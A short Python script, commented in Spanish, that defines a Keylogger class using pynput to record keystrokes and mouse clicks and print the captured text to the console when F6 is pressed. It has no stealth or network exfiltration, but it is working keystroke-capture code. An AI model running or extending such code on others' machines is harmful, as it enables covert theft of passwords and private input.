from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import asyncio
from pynput.keyboard import Key


class Keylogger:
    def __init__(self):
        self.log = ""
        self.exit_event = asyncio.Event()  



    def on_press(self,key):
        special_keys = {
            Key.enter: 'Enter',
            Key.esc: 'Esc',
            Key.space: 'Space',
            Key.tab: 'Tab',
            Key.backspace: 'Backspace',
            Key.shift: 'Shift',
            Key.shift_r: 'Shift',
            Key.ctrl: 'Ctrl',
            Key.ctrl_r: 'Ctrl',
            Key.alt: 'Alt',
            Key.alt_r:'Alt',
            Key.cmd: 'Cmd',
            Key.cmd_r: 'Cmd',
            Key.caps_lock: 'Bloq Mayus',
            Key.f1 : 'F1',
            Key.f2 : 'F2',
            Key.f3 : 'F3',
            Key.f4 : 'F4',
            Key.f5 : 'F5',
            Key.f6 : 'F6',
            Key.f7 : 'F7',
            Key.f8 : 'F8',
            Key.f9 : 'F9',
            Key.f10 : 'F10',
            Key.f11 : 'F11',
            Key.f12 : 'F12',
        }
        if key in special_keys:
            if special_keys[key] == 'Space':
                self.log+=' '

            elif special_keys[key] == 'Backspace':
                self.log = self.log[0:-1]

            elif special_keys[key] == 'Enter':
                self.log += '\n'
            
            elif special_keys[key] == 'F6':
                if self.log == '':
                    self.exit_event.set()
                print(self.log)
                self.log=''
            
            else:
                self.log+= f'[{special_keys[key].upper()}]'
            
        else:
            try:
                char = key.char
                if char:
                    self.log+=char
                
            except AttributeError:
                print(f'on_press {key} type: {type(key)}')

    def on_release(self,key):
        pass
        #print('on_release')

    def on_click(self,x, y, button, pressed):
        # Tu lógica aquí para manejar el evento de clic
        print(f'Click en ({x}, {y}) con el botón {button}, Presionado: {pressed}')

    async def listenKeyboard(self):
        with KeyboardListener(on_press=self.on_press, on_release=self.on_release) as keyboard_listener:
            await asyncio.Future()  # Espera indefinida para que la tarea no se complete automáticamente

    async def listenMouse(self):
        with MouseListener(on_click=self.on_click) as mouse_listener:
            await asyncio.Future()  # Espera indefinida para que la tarea no se complete automáticamente

    async def main(self):
        # Iniciar las tareas como objetos asyncio.Task
        task_keyboard = asyncio.create_task(self.listenKeyboard())
        task_mouse = asyncio.create_task(self.listenMouse())

        # Esperar que ambas tareas se completen
        await asyncio.gather(task_keyboard, task_mouse)

# Ejecutar el bucle de eventos de asyncio
if __name__ == '__main__':
    keylogger = Keylogger()
    asyncio.run(keylogger.main())
